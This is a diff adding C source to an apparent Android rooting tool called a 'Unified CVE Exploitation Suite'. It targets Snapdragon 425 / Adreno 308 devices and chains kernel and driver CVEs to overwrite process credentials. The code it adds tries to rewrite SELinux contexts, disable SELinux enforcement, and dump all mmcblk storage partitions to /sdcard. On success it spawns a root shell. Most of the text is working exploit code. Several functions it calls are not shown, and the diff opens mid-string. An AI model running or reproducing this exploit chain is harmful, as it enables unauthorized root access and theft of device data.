@@ -741,4 +741,342 @@ static int try_ptrace_methods(void) {
 static int try_selinux_methods(void) {
     printf("[*] Trying SELinux context rewrite...\n");
     const char *ctxs[] = {
-        "
+        "u:r:system_app:s0", "u:r:platform_app:s0",
+        "u:r:system_server:s0", "u:r:init:s0", "u:r:kernel:s0", NULL
+    };
+    const char *files[] = {
+        "/proc/self/attr/current", "/proc/self/attr/keycreate",
+        "/proc/self/attr/exec", "/proc/self/attr/fscreate", NULL
+    };
+    for (int fi = 0; files[fi] != NULL; fi++) {
+        int fd = open(files[fi], O_WRONLY);
+        if (fd < 0) continue;
+        for (int ci = 0; ctxs[ci] != NULL; ci++) {
+            lseek(fd, 0, SEEK_SET);
+            ssize_t n = write(fd, ctxs[ci], strlen(ctxs[ci]));
+            if (n == (ssize_t)strlen(ctxs[ci])) {
+                printf("  [+] %s changed to %s\n", files[fi], ctxs[ci]);
+                close(fd);
+                return 0;
+            }
+        }
+        close(fd);
+    }
+    int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
+    if (fd >= 0) {
+        if (write(fd, "0", 1) == 1) { printf("  [+] SELinux disabled!\n"); close(fd); return 0; }
+        close(fd);
+    }
+    return -1;
+}
+
+static void dump_block_devices(void) {
+    printf("[*] Attempting to dump block devices...\n");
+    DIR *dir = opendir("/dev/block");
+    if (!dir) { perror("  opendir /dev/block"); return; }
+    struct dirent *entry;
+    int count = 0;
+    while ((entry = readdir(dir)) != NULL && count < MAX_PARTITIONS) {
+        if (strncmp(entry->d_name, "mmcblk", 6) == 0) {
+            char path[256], outpath[256];
+            snprintf(path, sizeof(path), "/dev/block/%s", entry->d_name);
+            snprintf(outpath, sizeof(outpath), "/sdcard/dump_%s.bin", entry->d_name);
+            int fd = open(path, O_RDONLY);
+            if (fd < 0) { printf("  [-] Cannot open %s\n", path); continue; }
+            int out = open(outpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (out < 0) { close(fd); continue; }
+            char buf[4096];
+            ssize_t n;
+            size_t total = 0;
+            printf("  [+] Dumping %s -> %s\n", path, outpath);
+            while ((n = read(fd, buf, sizeof(buf))) > 0) {
+                if (write(out, buf, n) != n) break;
+                total += n;
+                if (total >= DUMP_MAX_SIZE) break;
+            }
+            close(fd); close(out);
+            printf("  [+] Dumped %zu bytes\n", total);
+            count++;
+        }
+    }
+    closedir(dir);
+}
+
+static int try_property_methods(void) {
+    printf("[*] Trying system property operations...\n");
+    int fd = open("/dev/socket/property_service", O_RDWR);
+    if (fd < 0) { perror("  open property_service"); return -1; }
+    const char *prop = "persist.test.poc", *value = "1";
+    size_t total = 4 + strlen(prop) + 1 + 4 + strlen(value) + 1;
+    uint8_t *data = malloc(total);
+    if (!data) { close(fd); return -1; }
+    size_t off = 0;
+    data[off++] = 0x02; data[off++] = 0x00; data[off++] = 0x00; data[off++] = 0x00;
+    size_t plen = strlen(prop) + 1;
+    data[off++] = (uint8_t)(plen & 0xFF);
+    data[off++] = (uint8_t)((plen >> 8) & 0xFF);
+    data[off++] = (uint8_t)((plen >> 16) & 0xFF);
+    data[off++] = (uint8_t)((plen >> 24) & 0xFF);
+    memcpy(data + off, prop, plen);
+    off += plen;
+    size_t vlen = strlen(value) + 1;
+    data[off++] = (uint8_t)(vlen & 0xFF);
+    data[off++] = (uint8_t)((vlen >> 8) & 0xFF);
+    data[off++] = (uint8_t)((vlen >> 16) & 0xFF);
+    data[off++] = (uint8_t)((vlen >> 24) & 0xFF);
+    memcpy(data + off, value, vlen);
+    ssize_t n = write(fd, data, total);
+    free(data);
+    close(fd);
+    if (n == (ssize_t)total) { printf("  [+] Property set attempted\n"); return 0; }
+    return -1;
+}
+
+/* ---- Info gathering ---- */
+static void gather_proc_info(void) {
+    printf("[*] Gathering /proc information...\n");
+    const char *files[] = {
+        "/proc/self/status", "/proc/self/stat", "/proc/self/attr/current",
+        "/proc/self/capability", "/proc/self/oom_score_adj",
+        "/proc/self/limits", "/proc/self/mounts", NULL
+    };
+    for (int i = 0; files[i] != NULL; i++) {
+        int fd = open(files[i], O_RDONLY);
+        if (fd < 0) continue;
+        char buf[1024] = {0};
+        ssize_t n = read(fd, buf, sizeof(buf)-1);
+        close(fd);
+        if (n > 0) {
+            char *line = strtok(buf, "\n");
+            while (line) {
+                if (strstr(line, "Uid:") || strstr(line, "Gid:") ||
+                    strstr(line, "Cap") || strstr(line, "oom"))
+                    printf("  %s\n", line);
+                line = strtok(NULL, "\n");
+            }
+        }
+    }
+}
+
+static void gather_system_info(void) {
+    int fd;
+    char buf[4096];
+    printf("[INFO] === System Information ===\n");
+    fd = open("/proc/version", O_RDONLY);
+    if (fd >= 0) {
+        ssize_t n = read(fd, buf, sizeof(buf)-1);
+        close(fd);
+        if (n > 0) { buf[n] = '\0'; printf("  Kernel: %s", buf); }
+    }
+    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
+    if (fd >= 0) {
+        ssize_t n = read(fd, buf, sizeof(buf)-1);
+        close(fd);
+        if (n > 0) { buf[n] = '\0'; printf("  SELinux enforcing: %s\n", buf); }
+    }
+    int sc = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
+    if (sc < 0) printf("  seccomp: unknown\n");
+    else if (sc == 0) printf("  seccomp: disabled\n");
+    else if (sc == 2) printf("  seccomp: enabled (filter)\n");
+    else printf("  seccomp: mode %d\n", sc);
+    printf("  UID: %d, GID: %d, EUID: %d, EGID: %d\n",
+           getuid(), getgid(), geteuid(), getegid());
+    fd = open("/proc/self/status", O_RDONLY);
+    if (fd >= 0) {
+        ssize_t n = read(fd, buf, sizeof(buf)-1);
+        close(fd);
+        if (n > 0) {
+            buf[n] = '\0';
+            char *line = strtok(buf, "\n");
+            while (line) {
+                if (strstr(line, "Uid:") || strstr(line, "Gid:") ||
+                    strstr(line, "Cap") || strstr(line, "Seccomp"))
+                    printf("  %s\n", line);
+                line = strtok(NULL, "\n");
+            }
+        }
+    }
+    struct __user_cap_header_struct cap_header = { _LINUX_CAPABILITY_VERSION_3, 0 };
+    struct __user_cap_data_struct cap_data[2] = {{0}};
+    if (capget(&cap_header, cap_data) == 0) {
+        printf("  Capabilities: eff=0x%llx, perm=0x%llx, inh=0x%llx\n",
+               (unsigned long long)cap_data[0].effective,
+               (unsigned long long)cap_data[0].permitted,
+               (unsigned long long)cap_data[0].inheritable);
+    }
+    printf("[INFO] === End System Information ===\n\n");
+}
+
+static int final_root_check(void) {
+    if (getuid() == 0) {
+        printf("\n[+] ========================================\n");
+        printf("[+] SUCCESS: Running as root (UID=0)!\n");
+        printf("[+] ========================================\n\n");
+        system("id");
+        system("echo '=== ROOT ACCESS ACHIEVED ===' > /data/local/tmp/root.txt");
+        system("id >> /data/local/tmp/root.txt");
+        system("ps -Z >> /data/local/tmp/root.txt");
+        system("getenforce >> /data/local/tmp/root.txt");
+        system("ls -la /data/local/tmp/root.txt");
+        pid_t pid = fork();
+        if (pid == 0) {
+            setuid(0); setgid(0);
+            execl("/system/bin/sh", "sh", NULL);
+            exit(1);
+        } else if (pid > 0) {
+            int status;
+            waitpid(pid, &status, 0);
+        }
+        g_root_achieved = 1;
+        return 0;
+    }
+    printf("\n[-] Still running as UID=%d\n", getuid());
+    return -1;
+}
+
+static int run_exploit_with_timeout(int (*func)(void), int timeout_sec) {
+    pid_t pid = fork();
+    if (pid == 0) {
+        exit(func() == 0 ? 0 : 1);
+    }
+    int status;
+    int remaining = timeout_sec;
+    while (remaining > 0) {
+        if (waitpid(pid, &status, WNOHANG) == pid) {
+            return (WIFEXITED(status) && WEXITSTATUS(status) == 0) ? 0 : -1;
+        }
+        sleep(1);
+        remaining--;
+    }
+    kill(pid, SIGKILL);
+    waitpid(pid, NULL, 0);
+    return -1;
+}
+
+/* ---- main ---- */
+int main(void) {
+    int cve_2019_2023_handle = -1;
+    int method_success = 0;
+    int kernel_rw_obtained = 0;
+    int gpu_leak_ok = 0;
+    int qseecom_ok = 0;
+    uint64_t leaked_addr = 0;
+
+    printf("==================================================\n");
+    printf("  Unified CVE Exploitation Suite v5.1\n");
+    printf("  (CVE-2019-2023, 2020-0041, 2020-0423,\n");
+    printf("   CVE-2022-25664, CVE-2021-1961,\n");
+    printf("   CVE-2023-20938-inspired)\n");
+    printf("  Target: SD425 / Adreno 308 (ARM64)\n");
+    printf("==================================================\n\n");
+
+    bind_cpu();
+    gather_system_info();
+
+    printf("[PHASE 1] CVE-2019-2023\n");
+    cve_2019_2023_handle = exploit_cve_2019_2023();
+
+    printf("\n[PHASE 2] CVE-2020-0041\n");
+    test_cve_2020_0041();
+
+    printf("\n[PHASE 3] CVE-2020-0423\n");
+    test_cve_2020_0423();
+
+    printf("\n[PHASE 4] CVE-2022-25664 (GPU leak - multi-try)\n");
+    for (int try = 0; try < 3; try++) {
+        if (exploit_cve_2022_25664_leak(&leaked_addr, &g_kernel_base) == 0) {
+            gpu_leak_ok = 1;
+            printf("  [+] GPU leak success: addr=0x%llx\n", (unsigned long long)leaked_addr);
+            if (g_task_struct == 0 && leaked_addr != 0) {
+                g_task_struct = leaked_addr;
+                g_cred_off = TASK_REAL_CRED_OFF;
+                if (setup_kernel_rw() == 0) {
+                    if (patch_kernel_cred() == 0) {
+                        printf("  [+] Cred patched via GPU leak!\n");
+                        if (getuid() == 0) { final_root_check(); return 0; }
+                    }
+                }
+            }
+            break;
+        }
+        usleep(200000);
+    }
+    if (!gpu_leak_ok) printf("  [-] GPU leak failed\n");
+
+    printf("\n[PHASE 5] CVE-2020-0423 (UAF) Kernel RW with improved spray\n");
+    if (run_exploit_with_timeout(exploit_cve_2020_0423_rw, 60) == 0) {
+        kernel_rw_obtained = 1;
+        printf("  [+] Kernel RW via CVE-2020-0423 obtained!\n");
+        if (setup_kernel_rw() == 0) {
+            if (patch_kernel_cred() == 0) {
+                printf("  [+] Cred patched via CVE-2020-0423!\n");
+                if (getuid() == 0) { final_root_check(); return 0; }
+            }
+        }
+    } else {
+        printf("  [-] CVE-2020-0423 RW failed or timed out\n");
+    }
+
+    printf("\n[PHASE 6] CVE-2020-0041 (OOB) cred overwrite attempt\n");
+    if (run_exploit_with_timeout(exploit_cve_2020_0041_patch_cred, 5) == 0) {
+        if (getuid() == 0) { final_root_check(); return 0; }
+    }
+
+    printf("\n[PHASE 7] CVE-2021-1961 (QSEECom - requires system uid)\n");
+    if (g_system_privilege || getuid() == 1000 || getuid() == 0) {
+        if (exploit_cve_2021_1961() == 0) {
+            qseecom_ok = 1;
+            if (getuid() == 0) { final_root_check(); return 0; }
+        }
+    } else {
+        printf("  [-] Skipping (need system or root uid, current=%d)\n", getuid());
+    }
+
+    printf("\n[PHASE 8] SELinux disable via kernel (CVE-2023-20938 inspired)\n");
+    if (g_krw_pipe[0] >= 0) {
+        try_selinux_disable_via_kernel();
+    } else {
+        printf("  [-] No kernel RW, skipping\n");
+    }
+
+    printf("\n[PHASE 9] Multi-method privilege escalation (fallback)\n");
+    int methods[] = {1,2,3,4,5,6,7,8};
+    for (size_t mi = 0; mi < sizeof(methods)/sizeof(methods[0]); mi++) {
+        if (g_root_achieved) break;
+        switch(methods[mi]) {
+            case 1: if (try_all_setuid_methods() == 0) method_success++; break;
+            case 2: if (try_capset_method() == 0) method_success++; break;
+            case 3: if (try_all_execve_methods() == 0) method_success++; break;
+            case 4: if (try_unshare_method() == 0) method_success++; break;
+            case 5: if (try_ptrace_methods() == 0) method_success++; break;
+            case 6: if (try_selinux_methods() == 0) method_success++; break;
+            case 7: if (try_property_methods() == 0) method_success++; break;
+            case 8: dump_block_devices(); break;
+        }
+        if (getuid() == 0) { g_root_achieved = 1; break; }
+    }
+
+    printf("\n[PHASE 10] Information gathering\n");
+    gather_proc_info();
+
+    printf("\n[PHASE 11] Final verification\n");
+    final_root_check();
+
+    printf("\n==================================================\n");
+    printf("  Summary:\n");
+    char msg[128];
+    if (cve_2019_2023_handle >= 0)
+        snprintf(msg, sizeof(msg), "SUCCESS (handle=%d)", cve_2019_2023_handle);
+    else
+        snprintf(msg, sizeof(msg), "FAILED");
+    printf("    CVE-2019-2023: %s\n", msg);
+    printf("    CVE-2022-25664: %s\n", gpu_leak_ok ? "LEAKED" : "FAILED");
+    printf("    CVE-2020-0423 RW: %s\n", kernel_rw_obtained ? "SUCCESS" : "FAILED");
+    printf("    CVE-2021-1961: %s\n", qseecom_ok ? "TRIGGERED" : "SKIPPED/FAILED");
+    printf("    Method successes: %d\n", method_success);
+    printf("    Root achieved: %s\n", g_root_achieved ? "YES" : "NO");
+    printf("    Final UID: %d\n", getuid());
+    printf("==================================================\n");
+
+    return g_root_achieved ? 0 : 1;
+}
